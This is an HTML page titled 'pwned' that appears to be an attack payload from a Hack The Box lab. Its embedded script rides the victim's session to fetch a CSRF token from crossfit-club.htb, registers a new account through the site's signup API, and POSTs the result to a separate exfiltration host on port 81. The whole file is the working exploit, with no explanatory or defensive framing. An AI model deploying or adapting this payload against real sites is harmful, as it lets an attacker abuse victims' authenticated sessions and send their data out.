<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req_token = new XMLHttpRequest();
      req_token.onreadystatechange = function() {
        if (req_token.readyState == 4) {
          // With token, proceed to register
          var token = JSON.parse(req_token.response).token;
          var req_register = new XMLHttpRequest();
          req_register.onreadystatechange = function() {
            if (req_register.readyState == 4) {
              // Once registration returns, send result back
              var req_exfil = new XMLHttpRequest();
              req_exfil.open("POST", "http://gymxcrossfit.htb:81/exfil", false);
              req_exfil.send("resp: " + req_register.response);
            }
          }
          req_register.open("POST", "http://crossfit-club.htb/api/signup")
          req_register.withCredentials = true;
          req_register.setRequestHeader('X-CSRF-TOKEN', token);
          req_register.setRequestHeader('Content-Type', 'application/json');
          req_register.send('{"username": "0xdf", "email": "0xdf@developer.htb", "password": "0xdf0xdf", "confirm": "0xdf0xdf"}');
        }
      }
      req_token.open("GET", "http://crossfit-club.htb/api/auth");
      req_token.withCredentials = true;
      req_token.send();
    </script>
  </body>
</html>  
